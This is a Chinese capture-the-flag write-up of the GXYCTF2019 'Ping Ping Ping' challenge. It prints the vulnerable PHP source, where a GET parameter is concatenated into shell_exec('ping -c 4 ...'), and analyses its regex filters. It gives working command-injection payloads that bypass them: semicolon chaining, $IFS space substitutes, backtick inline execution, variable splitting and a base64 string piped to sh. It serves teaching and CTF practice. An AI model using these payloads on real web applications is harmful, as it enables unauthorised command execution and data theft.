# [GXYCTF2019]Ping Ping Ping
TAG:PHP  命令执行  
## 解题过程：
![20201230103330](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230103330.png)  
推测可能是命令执行相关题目，进行测试  
```/?ip=127.0.0.1;ls```
![20201230104415](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230104415.png)  
尝试查看index.php内容,发现存在空格过滤  
![20201230105223](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230105223.png)
尝试进行过滤绕过  
> %20(space)、%09(tab)、$IFS$9、${IFS}$9、 {IFS}、IFS 

尝试几次发现```$IFS$9```可以成功绕过，成功查看index.php的内容获取到过滤规则    
![20201230110728](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230110728.png)
这里可以构造绕过，或者使用内联执行  
```
/?ip=127.0.0.1;cat$IFS$9`ls`
```
查看源代码获得flag  
![20201230111951](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230111951.png)
## 题目分析  
这是一道典型的PHP命令执行题目,通过分析```index.php```的代码可知
```
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```
此页面通过PHP内置的命令执行函数[shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php)实现了命令执行功能，函数将在命令正确执行之后输出执行结果   
![20201230113637](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230113637.png)
前端传输的参数被```$_GET['ip']```捕获，经过正则过滤后传输给```shell_exec()```，经与```"ping -c 4"```拼接后执行命令  
此时解题的思路已经十分明确，需构造绕过正则匹配过滤的参数进行命令执行获取敏感信息，下面进行过滤函数与正则表达式的分析  
  
此题目中使用了[preg_match()](https://www.php.net/manual/zh/function.preg-match.php)函数进行参数的匹配，此函数将根据搜索模式返回匹配（1）或者不匹配（0），支持正则表达式  
![20201230114603](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230114603.png)  
## 正则匹配过滤：
+ 第一次正则匹配：```/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/```  
对传入参数的第一次过滤中，过滤掉了```&```,```/```,```?```,```*```,```<```,```>```,```'```,```"```,```\```,```{```,```}```与```x{00}-x{1f}```代表的字符  
+ 第二次正则匹配：```/ /```  
过滤掉了空格  
+ 第三次正则匹配：```/bash/```  
过滤掉了```bash```字符串  
+ 第四次正则匹配：```/.*f.*l.*a.*g.*/```  
过滤掉含有```f```,```l```,```a```,```g```字符的字符串  
## 针对性的绕过:
+ 管道符的绕过  
为了进行自定义命令执行，需要使用管道符，但是管道符被正则匹配过滤，可以使用```;```进行上一条命令的结束，进而执行下一条自定义的命令
+ 空格的绕过  
执行命令需要空格分隔，可以考虑用字符编码绕过正则过滤实现分隔```%20(space)、%09(tab)、$IFS$9、${IFS}$9、 {IFS}、IFS ```  
+ flag字符过滤的绕过  
使用内联执行：
```
/?ip=127.0.0.1;cat$IFS$9`ls`
``` 
进行字符串拼接：
```
/?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php
```
通过sh命令执行：
```
/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```
如果没有过滤```bash```也可以通过```bash```执行